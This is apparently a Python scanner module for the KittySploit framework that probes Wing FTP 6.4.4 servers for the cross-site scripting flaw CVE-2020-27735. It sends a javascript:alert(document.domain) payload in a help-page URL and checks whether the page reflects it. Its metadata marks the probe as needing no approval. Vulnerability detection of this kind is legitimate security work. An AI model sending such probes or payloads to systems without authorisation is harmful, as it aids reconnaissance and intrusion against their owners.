#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Wing FTP 6."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Wing FTP 6.4.4 - Cross-Site Scripting Detection',
        'description': "Wing FTP 6.4.4 is vulnerable to cross-site scripting via its web interface because an arbitrary IFRAME element can be included in the help pages via a crafted link, leading to the execution of (sandboxed) arbitrary HTML and JavaScript in the user's browser.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'xss', 'wing-ftp', 'wftpserver', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.wftpserver.com/serverhistory.htm',
            'https://wshenk.blogspot.com/2021/01/xss-in-wing-ftps-web-interface-cve-2020.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-27735',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2020-27735',
    }

    def run(self):
        r = self.http_request(method="GET", path='/help/english/index.html?javascript:alert(document.domain)', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<frame name="hmcontent" src="javascript:alert(document.domain)" title="Content frame">',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Wing FTP 6.4.4 - Cross-Site Scripting detected",
                path='/help/english/index.html?javascript:alert(document.domain)',
            )
            return True
        return False

